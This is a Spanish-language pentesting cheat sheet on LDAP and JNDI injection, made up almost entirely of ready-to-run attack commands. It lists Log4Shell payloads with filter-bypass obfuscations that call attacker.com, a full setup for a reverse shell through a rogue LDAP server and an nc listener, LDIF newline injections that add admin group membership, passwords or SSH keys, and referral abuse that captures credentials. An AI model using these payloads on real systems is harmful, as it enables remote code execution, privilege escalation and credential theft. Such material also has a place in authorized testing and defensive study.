---
aliases:
  - JNDI Injection
  - Log4Shell
  - LDAP Entry Poisoning
  - LDAP Referral
tags:
  - vuln/ldap-injection
  - vuln/jndi-injection
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[LDAP Injection]]"
  - "[[Insecure Deserialization]]"
---
# LDAP Injection - JNDI y Entry Injection

---

## JNDI Lookup Injection (Log4Shell-style)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Exploit}' https://target/` | Pre-auth RCE Log4Shell-style | Backend Java loga User-Agent + Log4j ≤ 2.14. |
| `curl -H 'X-Forwarded-For: ${jndi:ldap://attacker.com:1389/x}' https://target/` | Inject via XFF header | Headers loggeados. |
| `curl -d 'username=${jndi:ldap://attacker.com:1389/x}&password=any' https://target/login` | Inject en body POST | Field reflejado en logs. |
| `curl 'https://target/?q=${jndi:ldap://attacker.com:1389/x}'` | Inject en query param | URL en access logs. |
| `curl -H 'User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}' https://target/` | Bypass `${jndi:` filter naive | WAF strip pattern. |
| `curl -H 'User-Agent: ${${env:NaN:-j}ndi:${env:NaN:-l}dap://attacker.com/x}' https://target/` | Env var nesting bypass | Filter más agresivo. |
| `curl -H 'User-Agent: ${jndi:ldaps://attacker.com:636/x}' https://target/` | TLS variant | Outbound LDAPS only. |
| `curl -H 'User-Agent: ${jndi:dns://attacker.com/x}' https://target/` | DNS canary (no RCE pero confirma) | Probe initial. |
| `curl -H 'User-Agent: ${jndi:rmi://attacker.com:1099/x}' https://target/` | RMI variant | Si LDAP filtered. |
^ldap-jndi-lookup

### Log4Shell setup completo

```bash
# 1. Atacante hostea LDAP server malicioso
git clone https://github.com/welk1n/JNDI-Injection-Exploit
cd JNDI-Injection-Exploit
mvn clean package -DskipTests
java -jar target/JNDI-Injection-Exploit-*-all.jar \
  -C "bash -c {echo,$(echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' | base64 -w0)}|{base64,-d}|bash" \
  -A attacker.com

# 2. Listener
nc -lvnp 4444

# 3. Trigger payload (User-Agent reflejado en logs)
curl -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/<base64-cmd>}' \
     https://target/
```

---

## LDAP Entry Poisoning

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapmodify -H ldaps://target -D "cn=admin,dc=target,dc=com" -w pass -f attacker.ldif` (con LDIF que add memberOf admin) | Privesc — agregar self a admin group | Atacante con bind valid. |
| `curl --data-urlencode "displayName=John%0auserPassword: $2b$10$..." https://target/profile/update` | LDIF inject password | App escribe LDIF sin sanitización. |
| `curl --data-urlencode "displayName=John%0amemberOf: cn=admins,dc=target,dc=com" https://target/profile/update` | Self-add a admin group via LDIF | Profile update vulnerable. |
| `curl --data-urlencode "displayName=John%0asshPublicKey: ssh-rsa AAAAB..." https://target/profile/update` | Inject SSH key (nss-ldap) | OS-level access path. |
| `ldapmodify -H ldap://target -x -D "cn=user,dc=target,dc=com" -w pass <<EOF\ndn: cn=user,dc=target,dc=com\nchangetype: modify\nadd: userPassword\nuserPassword: NEW\nEOF` | Direct password modify | Self-bind + modify own. |
| `curl --data-urlencode "displayName=Admin <admin@target.com>%0aobjectClass: organizationalPerson" https://target/register` | Phishing-context display name | UI confusion. |
^ldap-jndi-entry

---

## LDAP Referral Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 -c "from ldaptor.protocols.pureldap import LDAPSearchResultReference; ..."` (LDAP server custom retornando referral) | Capturar creds del client en re-bind | Client con `chase referrals=on`. |
| `slapd -h "ldap://0.0.0.0:389" -d 1` con config returning `ldap://attacker.com/` | Setup rogue LDAP server | Listener para referral chase. |
| `tcpdump -i any -A 'port 389 or port 636' \| grep -E 'cn=\|password'` | Capturar plain creds en re-bind | Post-referral tcpdump. |
| `ldapsearch -H ldap://target -x -D "cn=admin,..." -w pass -b "dc=target,dc=com"` con referral hijack | Force LDAP client to follow referral | Cross-domain query. |
| `dig +short SRV _ldap._tcp.target.com` | Discover all DCs (referral targets) | AD multi-DC recon. |
| `ldapsearch -H ldap://target -x -O "ManageDsaIT" -b "dc=target,dc=com"` | Disable referral chasing | Defense check. |
^ldap-jndi-referral

---

## Schema-Based Gadgets

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapmodify ... <<<"dn: cn=user,...\nchangetype: modify\nadd: jpegPhoto\njpegPhoto:< file:///path/payload.bin"` | Storage de payload binary | Atributo binario. |
| `ldapmodify ... add: description\ndescription: <large-encoded-data>` | Steganography / data store | Atributo description amplio. |
| `ldapmodify ... add: userCertificate\nuserCertificate;binary:< file:///cert.der"` | Cert malicioso storage | userCertificate binary attr. |
| `curl --data-urlencode "displayName=user%0amanager: cn=victim,dc=target,dc=com" https://target/profile/update` | DN reference manipulation | manager attribute. |
| `curl --data-urlencode "displayName=user%0aseeAlso: cn=admin,dc=target,dc=com" https://target/profile/update` | Search-time indirect ref | seeAlso DN. |
| `ldapsearch -H ldap://target -b "" -s base "(objectClass=*)" "+ *"` | Schema enumeration completo | Pre-attack recon. |
^ldap-jndi-schema

---
